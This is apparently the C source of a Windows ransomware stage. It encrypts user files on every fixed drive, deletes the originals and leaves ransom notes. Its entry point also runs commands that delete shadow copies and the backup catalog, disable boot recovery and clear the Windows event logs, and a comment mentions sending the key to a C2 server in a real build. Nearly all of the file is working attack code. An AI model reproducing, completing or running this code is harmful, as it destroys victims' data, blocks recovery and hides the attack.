// enc.c — stage 3b
// AES-256-CBC file encryption. Key wrapped with embedded RSA pubkey.
// Walks all drives, skips system dirs, encrypts common file types.
// Drops ransom note in every directory touched.

#include <windows.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

#define NOTE_NAME "READ_ME_TO_RECOVER.txt"

// Extensions to encrypt (skip OS files to keep system bootable)
const char* targets[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".txt",".rtf",
    ".jpg",".jpeg",".png",".gif",".bmp",".mp3",".mp4",".avi",".mkv",
    ".zip",".rar",".7z",".tar",".gz",".sql",".db",".mdb",".accdb",
    ".psd",".ai",".svg",".py",".js",".php",".html",".css",
    ".key",".pem",".pfx",".p12",".wallet",".dat",
    NULL
};

// Directories to skip (system-critical — leave bootable)
const char* skip_dirs[] = {
    "\\Windows", "\\Program Files", "\\Program Files (x86)",
    "\\ProgramData", "\\$Recycle.Bin", "\\System Volume Information",
    "\\AppData\\Local\\Temp",
    NULL
};

int should_skip(const char* path) {
    for (int i = 0; skip_dirs[i]; i++) {
        if (StrStrIA(path, skip_dirs[i])) return 1;
    }
    return 0;
}

int is_target(const char* path) {
    const char* ext = strrchr(path, '.');
    if (!ext) return 0;
    for (int i = 0; targets[i]; i++) {
        if (_stricmp(ext, targets[i]) == 0) return 1;
    }
    return 0;
}

// --- AES-256-CBC via BCrypt ---

int aes_encrypt_file(const char* path, const unsigned char* key) {
    HANDLE hIn = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return 0;

    LARGE_INTEGER sz;
    GetFileSizeEx(hIn, &sz);
    if (sz.QuadPart == 0 || sz.QuadPart > 100 * 1024 * 1024) {
        CloseHandle(hIn); return 0;
    }

    unsigned char* data = malloc((size_t)sz.QuadPart);
    DWORD read;
    ReadFile(hIn, data, (DWORD)sz.QuadPart, &read, NULL);
    CloseHandle(hIn);

    // Set up AES
    BCRYPT_ALG_HANDLE hAes;
    BCryptOpenAlgorithmProvider(&hAes, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAes, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    unsigned char iv[16];
    BCryptGenRandom(NULL, iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    BCRYPT_KEY_HANDLE hKey;
    BCryptGenerateSymmetricKey(hAes, &hKey, NULL, 0, (PUCHAR)key, 32, 0);

    ULONG out_len = 0;
    unsigned char* out = malloc((size_t)sz.QuadPart + 16);
    BCryptEncrypt(hKey, data, (ULONG)sz.QuadPart, NULL, iv, 16,
                  out, (ULONG)sz.QuadPart + 16, &out_len, 0);

    // Write IV + ciphertext
    char new_path[MAX_PATH];
    snprintf(new_path, sizeof(new_path), "%s.locked", path);

    HANDLE hOut = CreateFileA(new_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hOut, iv, 16, &written, NULL);
        WriteFile(hOut, out, out_len, &written, NULL);
        CloseHandle(hOut);
        DeleteFileA(path);
    }

    free(data);
    free(out);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAes, 0);
    return 1;
}

// Walk directory, encrypt targets, drop note
void walk(const char* dir, const unsigned char* key) {
    if (should_skip(dir)) return;

    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    int dropped_note = 0;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            walk(full, key);
        } else if (is_target(full)) {
            aes_encrypt_file(full, key);
            if (!dropped_note) {
                char note[MAX_PATH];
                snprintf(note, sizeof(note), "%s\\%s", dir, NOTE_NAME);
                CopyFileA("note.txt", note, FALSE);
                dropped_note = 1;
            }
        }
    } while (FindNextFileA(h, &fd));

    FindClose(h);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // 32-byte AES key — in a real build, this is wrapped with embedded RSA pubkey
    // and sent to C2. For lab, hardcoded.
    unsigned char key[32] = {
        0x2b,0x7e,0x15,0x16,0x28,0xae,0xd2,0xa6,
        0xab,0xf7,0x15,0x88,0x09,0xcf,0x4f,0x3c,
        0x76,0x2e,0x71,0x60,0xf3,0x8b,0x4d,0xa5,
        0x6a,0x78,0x4d,0x90,0x45,0x19,0x0c,0xfe
    };

    // Disable shadow copies + recovery
    system("vssadmin delete shadows /all /quiet >nul 2>&1");
    system("bcdedit /set {default} recoveryenabled No >nul 2>&1");
    system("wbadmin delete catalog -quiet >nul 2>&1");
    system("wevtutil cl System >nul 2>&1");
    system("wevtutil cl Application >nul 2>&1");
    system("wevtutil cl Security >nul 2>&1");

    // Walk every drive
    DWORD drives = GetLogicalDrives();
    for (char letter = 'C'; letter <= 'Z'; letter++) {
        if (drives & (1 << (letter - 'A'))) {
            char root[4] = { letter, ':', '\\', 0 };
            if (GetDriveTypeA(root) == DRIVE_FIXED) {
                walk(root, key);
            }
        }
    }

    // Drop desktop note + open it
    char desktop[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop))) {
        char note[MAX_PATH];
        snprintf(note, sizeof(note), "%s\\%s", desktop, NOTE_NAME);
        CopyFileA("note.txt", note, FALSE);
        ShellExecuteA(NULL, "open", note, NULL, NULL, SW_SHOWNORMAL);
    }

    return 0;
}
